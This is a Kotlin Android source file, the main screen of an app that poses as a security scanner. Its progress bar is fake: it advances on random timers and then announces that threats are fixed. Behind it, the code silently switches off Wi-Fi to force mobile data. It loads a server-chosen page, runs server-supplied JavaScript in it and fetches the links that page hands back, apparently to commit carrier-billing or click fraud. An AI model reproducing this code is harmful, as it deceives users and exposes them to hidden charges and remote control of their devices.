package ru.mail.aslanisl.webviewapplication

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.net.ConnectivityManager
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.provider.Settings
import android.support.v7.app.AlertDialog
import android.support.v7.app.AppCompatActivity
import android.view.View
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.webkit.WebViewClient
import kotlinx.android.synthetic.main.activity_main.*
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

private const val TASK_TIME = 60 * 1000L

class MainActivity : AppCompatActivity(), Callback<String> {
    private var jSCommandsInvoked = false
    private var callback: (() -> Unit)? = null
    private var callbackHrefs: ((String) -> Unit)? = null

    private val progressHandler = Handler()
    private var startTime = System.currentTimeMillis()
    private var taskStarted = false
    private val progressTask = object : Runnable {
        override fun run() {
            taskStarted = true
            val diff = System.currentTimeMillis() - startTime

            val percentAbs: Double = 1 - ((TASK_TIME - diff) / TASK_TIME.toDouble())
            val percent = (percentAbs * 100).toInt()
            if (percent < 100) {
                updateProgress(percent)
                val leftLimit = 300L
                val rightLimit = 3000L
                val generatedLong = leftLimit + (Math.random() * (rightLimit - leftLimit)).toLong()
                progressHandler.postDelayed(this, generatedLong)
            } else {
                taskStarted = false
                showFinish()
            }
        }
    }

    private val dialog by lazy {
        val builder = AlertDialog.Builder(this)
        builder.setMessage(R.string.for_work_turn_on_mobile_data)
        builder.setPositiveButton(getString(android.R.string.ok)) { dialog, _ ->
            try {
                val i = Intent(Settings.ACTION_WIRELESS_SETTINGS)
                startActivity(i)
            } catch (e: Exception) {
                e.printStackTrace()
            }
            dialog.dismiss()
        }
        builder.setCancelable(false)
        return@lazy builder.create()
    }

    private val connectedReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (checkConnection()) {
                startTask()
                dialog.dismiss()
            } else
                stopTask()
        }
    }

    private var call: Call<ServerResponse>? = null
    private var serverData: ServerResponse? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        registerReceiver(connectedReceiver, IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION))
        callbackHrefs = { initHrefs(it) }

        initWebView()
    }

    override fun onStart() {
        super.onStart()
        if (checkConnection().not()) return
        startTask()
        if (serverData != null) return
        call?.cancel()
        call = Webservice.loadServerResponse(object : Callback<ServerResponse> {
            override fun onFailure(call: Call<ServerResponse>?, t: Throwable?) {}

            override fun onResponse(call: Call<ServerResponse>?, response: Response<ServerResponse>?) {
                val serverData = response?.body() ?: return

                webView.loadUrl(serverData.url)

                callback = { involveCommands(JSCommanFactory.generateCommands(serverData.elements)) }
                this@MainActivity.serverData = serverData
            }
        })

    }

    private fun startTask(){
        if (taskStarted.not()) {
            startTime = System.currentTimeMillis()
            progressHandler.post(progressTask)
        }
    }

    private fun stopTask(){
        progressHandler.removeCallbacks(progressTask)
        taskStarted = false
        updateProgress(0)
    }

    private fun checkConnection(): Boolean {
        val wifiManager =
            this.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        wifiManager.isWifiEnabled = false

        if (isConnected()) return true

        if (dialog.isShowing.not()) dialog.show()
        return false
    }

    private fun isConnected() : Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        return cm.activeNetworkInfo?.isConnectedOrConnecting ?: false
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun initWebView() {
        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                if (jSCommandsInvoked.not()) {
                    //Wait a bit lo load JS
                    Handler().postDelayed({ Webservice.doWork(callback) }, 500)
                }
            }
        }

        webView.webChromeClient = WebChromeClient()
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true
        webView.setLayerType(2, null)
        webView.settings.allowFileAccessFromFileURLs = true
        webView.settings.allowUniversalAccessFromFileURLs = true
        webView.setBackgroundColor(Color.WHITE)
        if (BuildConfig.DEBUG && Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            WebView.setWebContentsDebuggingEnabled(true)
        }

        webView.addJavascriptInterface(JSInterface(callbackHrefs), "Android")
    }

    private fun involveCommands(commands: List<JSCommand>) {
        jSCommandsInvoked = true
        commands.forEach {
            it.command?.let { command ->
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                    webView.evaluateJavascript("javascript:$command", null)
                } else {
                    webView.loadUrl("javascript:$command")
                }
            }
        }
    }

    private fun initHrefs(hrefs: String) {
        val hrefsList = hrefs.split(",")
        hrefsList.forEach {
            Webservice.webApi.loadUrl(it).enqueue(this)
        }
    }

    override fun onFailure(call: Call<String>?, t: Throwable?) {}

    override fun onResponse(call: Call<String>?, response: Response<String>?) {}

    private fun updateProgress(percent: Int) {
        progressBar.progress = percent
        progressText.text = "$percent%"
    }

    private fun showFinish() {
        titleView.setText(R.string.scanning_finish)
        progressContainer.visibility = View.GONE
        threadsFixed.visibility = View.VISIBLE
    }

    override fun onDestroy() {
        super.onDestroy()
        callback = null
        callbackHrefs = null
        unregisterReceiver(connectedReceiver)
        stopTask()
        call?.cancel()
    }
}
